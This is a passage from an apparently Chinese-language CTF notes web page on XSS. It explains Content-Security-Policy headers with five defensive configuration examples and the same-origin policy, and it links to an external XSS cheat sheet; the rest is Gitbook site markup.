+CSP&#x901A;&#x8FC7;&#x6307;&#x5B9A;&#x6709;&#x6548;&#x57DF;&#x2014;&#x2014;&#x5373;&#x6D4F;&#x89C8;&#x5668;&#x8BA4;&#x53EF;&#x7684;&#x53EF;&#x6267;&#x884C;&#x811A;&#x672C;&#x7684;&#x6709;&#x6548;&#x6765;&#x6E90;&#x2014;&#x2014;&#x4F7F;&#x670D;&#x52A1;&#x5668;&#x7BA1;&#x7406;&#x8005;&#x6709;&#x80FD;&#x529B;&#x51CF;&#x5C11;&#x6216;&#x6D88;&#x9664;XSS&#x653B;&#x51FB;&#x6240;&#x4F9D;&#x8D56;&#x7684;&#x8F7D;&#x4F53;&#x3002;&#x4E00;&#x4E2A;CSP&#x517C;&#x5BB9;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x5C06;&#x4F1A;&#x4EC5;&#x6267;&#x884C;&#x4ECE;&#x767D;&#x540D;&#x5355;&#x57DF;&#x83B7;&#x53D6;&#x5230;&#x7684;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x5FFD;&#x7565;&#x6240;&#x6709;&#x7684;&#x5176;&#x4ED6;&#x811A;&#x672C; (&#x5305;&#x62EC;&#x5185;&#x8054;&#x811A;&#x672C;&#x548C;HTML&#x7684;&#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x5C5E;&#x6027;)&#x3002;
+<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p>
+</blockquote>
+<p>&#x7B80;&#x5355;&#x7684;&#x6765;&#x8BF4;CSP&#x5C31;&#x662F;&#x6D4F;&#x89C8;&#x5668;&#x5728;&#x52A0;&#x8F7D;&#x7F51;&#x9875;&#x5185;&#x5916;&#x8054;&#x7684;&#x5176;&#x4ED6;&#x8D44;&#x6E90;<code>js,css,img</code>&#x7B49;&#xFF0C;&#x4F1A;&#x68C0;&#x6D4B;&#x6765;&#x6E90;&#x662F;&#x4E0D;&#x662F;&#x6765;&#x81EA;&#x53EF;&#x4FE1;&#x7684;&#x57DF;&#xFF0C;&#x6709;&#x6548;&#x907F;&#x514D;&#x6076;&#x610F;&#x63D2;&#x5165;&#x5230;&#x7F51;&#x9875;&#x4E2D;&#x7684;xss&#x88AB;&#x6267;&#x884C;</p>
+<p>CSP&#x7B56;&#x7565;&#x901A;&#x8FC7;&#x670D;&#x52A1;&#x7AEF;&#x53D1;&#x9001;&#x7684;<code>Content-Security-Policy</code> HTTP&#x5934;&#x6765;&#x6307;&#x5B9A;</p>
+<p>&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x7684;&#x51E0;&#x4E2A;&#x793A;&#x4F8B;&#x80FD;&#x591F;&#x5FEB;&#x901F;&#x7406;&#x89E3;csp&#x7684;&#x8BED;&#x6CD5;&#x89C4;&#x5219;</p>
+<p>&#x793A;&#x4F8B; 1
+&#x4E00;&#x4E2A;&#x7F51;&#x7AD9;&#x7BA1;&#x7406;&#x8005;&#x60F3;&#x8981;&#x6240;&#x6709;&#x5185;&#x5BB9;&#x5747;&#x6765;&#x81EA;&#x7AD9;&#x70B9;&#x7684;&#x540C;&#x4E00;&#x4E2A;&#x6E90; (&#x4E0D;&#x5305;&#x62EC;&#x5176;&#x5B50;&#x57DF;&#x540D;)</p>
+<pre><code>Content-Security-Policy: default-src &apos;self&apos;
+</code></pre><p>&#x793A;&#x4F8B; 2
+&#x4E00;&#x4E2A;&#x7F51;&#x7AD9;&#x7BA1;&#x7406;&#x8005;&#x5141;&#x8BB8;&#x5185;&#x5BB9;&#x6765;&#x81EA;&#x4FE1;&#x4EFB;&#x7684;&#x57DF;&#x540D;&#x53CA;&#x5176;&#x5B50;&#x57DF;&#x540D; (&#x57DF;&#x540D;&#x4E0D;&#x5FC5;&#x987B;&#x4E0E;CSP&#x8BBE;&#x7F6E;&#x6240;&#x5728;&#x7684;&#x57DF;&#x540D;&#x76F8;&#x540C;)</p>
+<pre><code>Content-Security-Policy: default-src &apos;self&apos; *.trusted.com
+</code></pre><p>&#x793A;&#x4F8B; 3
+&#x4E00;&#x4E2A;&#x7F51;&#x7AD9;&#x7BA1;&#x7406;&#x8005;&#x5141;&#x8BB8;&#x7F51;&#x9875;&#x5E94;&#x7528;&#x7684;&#x7528;&#x6237;&#x5728;&#x4ED6;&#x4EEC;&#x81EA;&#x5DF1;&#x7684;&#x5185;&#x5BB9;&#x4E2D;&#x5305;&#x542B;&#x6765;&#x81EA;&#x4EFB;&#x4F55;&#x6E90;&#x7684;&#x56FE;&#x7247;, &#x4F46;&#x662F;&#x9650;&#x5236;&#x97F3;&#x9891;&#x6216;&#x89C6;&#x9891;&#x9700;&#x4ECE;&#x4FE1;&#x4EFB;&#x7684;&#x8D44;&#x6E90;&#x63D0;&#x4F9B;&#x8005;(&#x83B7;&#x5F97;)&#xFF0C;&#x6240;&#x6709;&#x811A;&#x672C;&#x5FC5;&#x987B;&#x4ECE;&#x7279;&#x5B9A;&#x4E3B;&#x673A;&#x670D;&#x52A1;&#x5668;&#x83B7;&#x53D6;&#x53EF;&#x4FE1;&#x7684;&#x4EE3;&#x7801;.</p>
+<pre><code>Content-Security-Policy: default-src &apos;self&apos;; img-src *; media-src media1.com media2.com; script-src userscripts.example.com
+</code></pre><p>&#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x5404;&#x79CD;&#x5185;&#x5BB9;&#x9ED8;&#x8BA4;&#x4EC5;&#x5141;&#x8BB8;&#x4ECE;&#x6587;&#x6863;&#x6240;&#x5728;&#x7684;&#x6E90;&#x83B7;&#x53D6;, &#x4F46;&#x5B58;&#x5728;&#x5982;&#x4E0B;&#x4F8B;&#x5916;:</p>
+<p>&#x56FE;&#x7247;&#x53EF;&#x4EE5;&#x4ECE;&#x4EFB;&#x4F55;&#x5730;&#x65B9;&#x52A0;&#x8F7D;(&#x6CE8;&#x610F; &quot;*&quot; &#x901A;&#x914D;&#x7B26;)&#x3002;
+&#x591A;&#x5A92;&#x4F53;&#x6587;&#x4EF6;&#x4EC5;&#x5141;&#x8BB8;&#x4ECE; media1.com &#x548C; media2.com &#x52A0;&#x8F7D;(&#x4E0D;&#x5141;&#x8BB8;&#x4ECE;&#x8FD9;&#x4E9B;&#x7AD9;&#x70B9;&#x7684;&#x5B50;&#x57DF;&#x540D;)&#x3002;
+&#x53EF;&#x8FD0;&#x884C;&#x811A;&#x672C;&#x4EC5;&#x5141;&#x8BB8;&#x6765;&#x81EA;&#x4E8E;userscripts.example.com&#x3002;</p>
+<p>&#x793A;&#x4F8B; 4
+&#x4E00;&#x4E2A;&#x7EBF;&#x4E0A;&#x94F6;&#x884C;&#x7F51;&#x7AD9;&#x7684;&#x7BA1;&#x7406;&#x8005;&#x60F3;&#x8981;&#x786E;&#x4FDD;&#x7F51;&#x7AD9;&#x7684;&#x6240;&#x6709;&#x5185;&#x5BB9;&#x90FD;&#x8981;&#x901A;&#x8FC7;SSL&#x65B9;&#x5F0F;&#x83B7;&#x53D6;&#xFF0C;&#x4EE5;&#x907F;&#x514D;&#x653B;&#x51FB;&#x8005;&#x7A83;&#x542C;&#x7528;&#x6237;&#x53D1;&#x51FA;&#x7684;&#x8BF7;&#x6C42;&#x3002;</p>
+<pre><code>Content-Security-Policy: default-src https://onlinebanking.jumbobank.com
+</code></pre><p>&#x8BE5;&#x670D;&#x52A1;&#x5668;&#x4EC5;&#x5141;&#x8BB8;&#x901A;&#x8FC7;HTTPS&#x65B9;&#x5F0F;&#x5E76;&#x4EC5;&#x4ECE;onlinebanking.jumbobank.com&#x57DF;&#x540D;&#x6765;&#x8BBF;&#x95EE;&#x6587;&#x6863;&#x3002;</p>
+<p>&#x793A;&#x4F8B; 5
+&#x4E00;&#x4E2A;&#x5728;&#x7EBF;&#x90AE;&#x7BB1;&#x7684;&#x7BA1;&#x7406;&#x8005;&#x60F3;&#x8981;&#x5141;&#x8BB8;&#x5728;&#x90AE;&#x4EF6;&#x91CC;&#x5305;&#x542B;HTML&#xFF0C;&#x540C;&#x6837;&#x56FE;&#x7247;&#x5141;&#x8BB8;&#x4ECE;&#x4EFB;&#x4F55;&#x5730;&#x65B9;&#x52A0;&#x8F7D;&#xFF0C;&#x4F46;&#x4E0D;&#x5141;&#x8BB8;JavaScript&#x6216;&#x8005;&#x5176;&#x4ED6;&#x6F5C;&#x5728;&#x7684;&#x5371;&#x9669;&#x5185;&#x5BB9;(&#x4ECE;&#x4EFB;&#x610F;&#x4F4D;&#x7F6E;&#x52A0;&#x8F7D;)&#x3002;</p>
+<pre><code>Content-Security-Policy: default-src &apos;self&apos; *.mailsite.com; img-src *
+</code></pre><h3 id="&#x540C;&#x6E90;&#x7B56;&#x7565;"><a name="&#x540C;&#x6E90;&#x7B56;&#x7565;" class="anchor-navigation-ex-anchor" href="#&#x540C;&#x6E90;&#x7B56;&#x7565;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x540C;&#x6E90;&#x7B56;&#x7565;</h3>
+<p>&#x5982;&#x679C;&#x4E24;&#x4E2A; URL &#x7684; protocol&#x3001;port (&#x5982;&#x679C;&#x6709;&#x6307;&#x5B9A;&#x7684;&#x8BDD;)&#x548C; host &#x90FD;&#x76F8;&#x540C;&#x7684;&#x8BDD;&#xFF0C;&#x5219;&#x8FD9;&#x4E24;&#x4E2A; URL &#x662F;&#x540C;&#x6E90;&#x3002;&#x8FD9;&#x4E2A;&#x65B9;&#x6848;&#x4E5F;&#x88AB;&#x79F0;&#x4E3A;&#x201C;&#x534F;&#x8BAE;/&#x4E3B;&#x673A;/&#x7AEF;&#x53E3;&#x5143;&#x7EC4;&#x201D;&#xFF0C;&#x6216;&#x8005;&#x76F4;&#x63A5;&#x662F; &#x201C;&#x5143;&#x7EC4;&#x201D;&#x3002;&#xFF08;&#x201C;&#x5143;&#x7EC4;&#x201D; &#x662F;&#x6307;&#x4E00;&#x7EC4;&#x9879;&#x76EE;&#x6784;&#x6210;&#x7684;&#x6574;&#x4F53;&#xFF0C;&#x53CC;&#x91CD;/&#x4E09;&#x91CD;/&#x56DB;&#x91CD;/&#x4E94;&#x91CD;/&#x7B49;&#x7684;&#x901A;&#x7528;&#x5F62;&#x5F0F;&#xFF09;&#x3002;</p>
+<h2 id="cheatsheet"><a name="cheatsheet" class="anchor-navigation-ex-anchor" href="#cheatsheet"><i class="fa fa-link" aria-hidden="true"></i></a>CheatSheet</h2>
+<p>Cross-site scripting (XSS) cheat sheet&#xFF1A;</p>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a> </p>
+<footer class="page-footer"><span class="copyright">&#xA9; Eki&apos;s CTF-notes 2019-2021 CC-by-nc-sa 4.0&#x3002; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x672C;&#x7F51;&#x7AD9;&#x6700;&#x540E;&#x4FEE;&#x8BA2;&#x4E8E;&#xFF1A;
+2021-05-07 16:30:35
+</span></footer> <link rel="stylesheet" type="text/css" href="https://storage.googleapis.com/app.klipse.tech/css/codemirror.css"> <script>     window.klipse_settings = {         selector: ".language-klipse, .lang-eval-clojure",         selector_eval_js: ".lang-eval-js",         selector_eval_python_client: ".lang-eval-python",         selector_eval_php: ".lang-eval-php",         selector_eval_scheme: ".lang-eval-scheme",         selector_eval_ruby: ".lang-eval-ruby",         selector_reagent: ".lang-reagent",        selector_google_charts: ".lang-google-chart",        selector_es2017: ".lang-eval-es2017",        selector_jsx: ".lang-eval-jsx",        selector_transpile_jsx: ".lang-transpile-jsx",        selector_render_jsx: ".lang-render-jsx",        selector_react: ".lang-react",        selector_eval_markdown: ".lang-render-markdown",        selector_eval_lambdaway: ".lang-render-lambdaway",        selector_eval_cpp: ".lang-eval-cpp",        selector_eval_html: ".lang-render-html",        selector_sql: ".lang-eval-sql",        selector_brainfuck: "lang-eval-brainfuck",        selector_js: ".lang-transpile-cljs"    }; </script> <script src="https://storage.googleapis.com/app.klipse.tech/plugin/js/klipse_plugin.js"></script>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="xxe.html" class="navigation navigation-prev " aria-label="Previous page: XXE">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="shell.html" class="navigation navigation-next " aria-label="Next page: Shell">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"XSS","level":"1.2.9","depth":2,"next":{"title":"Shell","level":"1.2.10","depth":2,"path":"library/shell.md","ref":"library/shell.md","articles":[]},"previous":{"title":"XXE","level":"1.2.8","depth":2,"path":"library/xxe.md","ref":"library/xxe.md","articles":[]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","katex","tbfed-pagefooter","theme-comscore","anchor-navigation-ex","-lunr","-search","search-plus","custom-favicon","ga","multipart","advanced-emoji","github","-sharing","sharing-plus","klipse","donate","pageview-count","code","lightbox","auto-scroll-table"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"&copy Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。","modify_label":"本网站最后修订于：","modify_format":"YYYY-MM-DD HH:mm:ss"},"github":{"url":"https://github.com/ekixu"},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"auto-scroll-table":{},"multipart":{},"code":{"copyButtons":true},"donate":{"alipay":"https://ctf.ieki.xyz/assets/images/alipay.jpg","alipayText":"支付宝打赏","button":"赏","title":"","wechat":"https://ctf.ieki.xyz/assets/images/wechat.jpg","wechatText":"微信打赏"},"katex":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-navicon","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"favicon":"/assets/images/favicon.ico","lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"pageview-count":{},"custom-favicon":{},"ga":{"configuration":"auto","token":"UA-156105693-2"},"klipse":{"myConfigKey":"it's the default value"},"advanced-emoji":{"embedEmojis":false},"sharing":{"qq":false,"all":["douban","facebook","google","instapaper","linkedin","twitter","weibo","messenger","qq","qzone","viber","whatsapp"],"douban":false,"facebook":false,"weibo":true,"twitter":true,"pocket":false,"google":true,"qzone":true},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Eki","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Eki's CTF","links":{"sidebar":{"主站 Eki's Blog":"https://ieki.xyz"}},"gitbook":"*","description":"CTF笔记"},"file":{"path":"library/xss.md","mtime":"2021-05-07T08:30:35.937Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-05-07T08:31:26.574Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-auto-scroll-table/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
+        
+    
+
+    </body>
+</html>
+
